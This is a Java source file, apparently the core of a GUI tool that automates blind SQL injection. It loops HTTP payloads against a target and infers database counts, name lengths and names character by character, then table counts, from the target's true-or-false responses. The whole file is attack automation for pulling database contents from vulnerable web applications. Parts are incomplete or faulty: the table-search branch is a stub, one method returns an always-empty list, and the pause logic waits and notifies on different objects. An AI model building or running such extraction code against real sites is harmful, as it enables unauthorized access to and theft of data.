/**
 * @ BlindSQLInjectionManager.java
 */
package logic;

import java.util.ArrayList;
import java.util.List;
import javax.swing.SwingWorker;
import javax.swing.table.DefaultTableModel;

import domain.HttpPayload;
import domain.UserInput;
import domain.enumeration.QueryType;
import domain.enumeration.TargetType;
import ui.BlindSQLInjectionInputUI;
import ui.BlindSQLInjectionResultUI;

/**
 * <pre>
 * logic
 * BlindSQLInjectionManager.java 
 * </pre>
 *
 * @brief	: 
 * @author	: Jae-Woong Moon(mjw8585@gmail.com)
 * @Date	: 2017/09/05
 */
public class BlindSQLInjectionManager{

	/** helper classes **/
	private SuccessDecider decider = null;
	private HttpHelper HttpHelper = null;
	private HttpPayloadFactory factory = null;
	
	/** ui references **/
	private BlindSQLInjectionInputUI inputUI = null;
	private BlindSQLInjectionResultUI resultUI = null;
	
	/** print variables **/
	private int requestCount = 0;
	private UserInput input;
	private InjectionWorker worker = new InjectionWorker();
	
	/** control variables  **/
	private boolean canceled = false;
	private boolean paused = false;
	
	public BlindSQLInjectionManager() {
		decider = new SuccessDecider();
		HttpHelper = new HttpHelper();
		factory = new HttpPayloadFactory();
	}
	
	public void setResultUI(BlindSQLInjectionResultUI resultUI) {
		this.resultUI = resultUI;
	}
	
	public void setInputUI(BlindSQLInjectionInputUI inputUI){
		this.inputUI = inputUI;
	}
	

	public void start(UserInput input){
		this.input = input;
		if (canceled && !paused) {
			worker = new InjectionWorker();
			resultUI.clearResults();
		}
		
		// start worker
		worker.execute();
		
		if (paused){
			resume();
		}
	}
	
	public void pause(){
		System.out.println("===== PAUSE");
		paused = true;
	}
	
	public void stop(){
		worker.cancel(true);
		requestCount = 0;
		canceled = true;
		paused = false;
	}
	
	private synchronized void resume(){
		System.out.println("Resume work...");
		paused = false;
		this.notify();
	}
	

	class InjectionWorker extends SwingWorker<Boolean, Void> {
		
		@Override
		protected Boolean doInBackground() throws Exception {
			// case 1) Target이 DB인 경우
			if(input.getTargetType() == TargetType.DB_SCHEMA){
				dbSearch(input);
			}
			// case 2) Target이 Table인 경우
			if(input.getTargetType() == TargetType.TABLE){
				// search table
			}
			System.out.println("==== Worker job has done.");
			inputUI.initButtons();
			return true;
		}
		
		
		// db 스키마 검색
		private void dbSearch(UserInput input){

			input.setTargetType(TargetType.DB_SCHEMA);
			/* STEP 1. search db count */
			int dbCount = searchDBCount(input);
			if(dbCount == 0){
				return ;
			}
			// setting result table
			DefaultTableModel dbTableModel =  resultUI.getDBResultUI().getTableModel();
			for (int i=0; i < dbCount; i++){
				Integer[] row = {i+1};
				dbTableModel.addRow(row);
			}
			
			// STEP 2. search db name lengths
			List<Integer> dbNameLengths = searchDBNameLength(input, dbCount, dbTableModel);
			
			// STEP 3. search db names
			List<String> dbNames = searchDBNames(input, dbCount, dbNameLengths, dbTableModel);
			
			// STEP 4. search table counts
			input.setTargetType(TargetType.TABLE);
			List<Integer> tableCounts = searchTableCounts(input, dbNames, dbTableModel);
				
		}

		/** DB **/
		private int searchDBCount(UserInput input){
			input.setQueryType(QueryType.COUNT);
			return cntWork(input, input.getCountUntil());
		}
		

		
		private List<Integer> searchDBNameLength(UserInput input, int dbCount, DefaultTableModel updateTo){
			List<Integer> result = new ArrayList<Integer>();
			input.setQueryType(QueryType.LENGTH);
			
			for (int i=0; i < dbCount; i++){
				input.setDbIndex(i);
				int length = cntWork(input,input.getLengthUntil());
				result.add(length);
				updateTo.setValueAt(length, i, 1); // update GUI
				updateTo.fireTableDataChanged();
			}
			return result;
		}
		
		public List<String> searchDBNames(UserInput input, int dbCount, List<Integer> dbNameLengths, DefaultTableModel updateTo){
			List<String> dbNames = new ArrayList<String>();
			input.setQueryType(QueryType.CONTENT);
			
			for (int i=0; i < dbCount; i++){
				input.setDbIndex(i); 
				String dbName = searchDBName(input, dbNameLengths.get(i));
				dbNames.add(dbName);
				updateTo.setValueAt(dbName, i, 2);
				updateTo.fireTableDataChanged();
			}
			return dbNames;
		}
		
		private String searchDBName(UserInput input, int dbNameLength){
			String content = "";
			for(int i=0; i < dbNameLength ; i++){
				input.setDbNameIndex(i+1); 
				content += contentWork(input);
			}
			return content;
		}
		

		
		/** Tables **/
		private List<Integer> searchTableCounts(UserInput input, List<String> dbNames, DefaultTableModel updateTo){
			List<Integer> tableCounts = new ArrayList<Integer>();
			input.setQueryType(QueryType.COUNT);
			for(int i=0; i < dbNames.size(); i++){
				int tableCount = searchTableCount(input, dbNames.get(i));
				updateTo.setValueAt(tableCount, i, 3);
				updateTo.fireTableDataChanged();
			}
			return tableCounts;
		}
		
		private int searchTableCount(UserInput input, String dbName){
			int tableCount = 0;
			input.setDbName(dbName);
			tableCount = cntWork(input, input.getCountUntil());
			return tableCount;
		}
		
		
		/** common **/
		private int cntWork(UserInput input, int until){
			
			int cnt = 0;
			for(int i=0; i < until; i++){
				if(!isCancelled()){
					//System.out.println("Cnt work : " + i);
					if(paused){
						//System.out.println("BackGround paused, waiting for resume");
						try{
							synchronized(this){
								wait(1000);
								i--;
							}
						} catch(InterruptedException ex){
							System.out.println("Background interrupted");
						}
					}else{
						requestCount++;
						inputUI.getStatusField().setText(requestCount+""); //update status label
						input.setCheckVal(i+"");
						HttpPayload payload = factory.getHttpPayload(input);
						String res = HttpHelper.send(payload);
						if(decider.isSuccess(res, input.getMatch())){
							cnt = i;
							break;
						}
					}
				}
			}
			return cnt;
		}
		
		private String contentWork(UserInput input){
			String ascii = "";
			
			for(int j=33; j < 127; j++){ //(search ascii 33~126)
				if(!isCancelled()){
					if(paused){
						//System.out.println("BackGround paused, waiting for resume");
						try{
							synchronized(this){
								wait(1000);
								j--;
							}
						} catch(InterruptedException ex){
							System.out.println("Background interrupted");
						}
					}else{
						requestCount++;
						inputUI.getStatusField().setText(requestCount+""); //update status label
						input.setCheckVal("char("+j+")");
						HttpPayload payload = factory.getHttpPayload(input);
						String res = HttpHelper.send(payload);
						if(decider.isSuccess(res, input.getMatch())){
							ascii = Character.toString((char)j);
							break;
						}
					}
				}
			}
			return ascii;
		}
	}
	
}
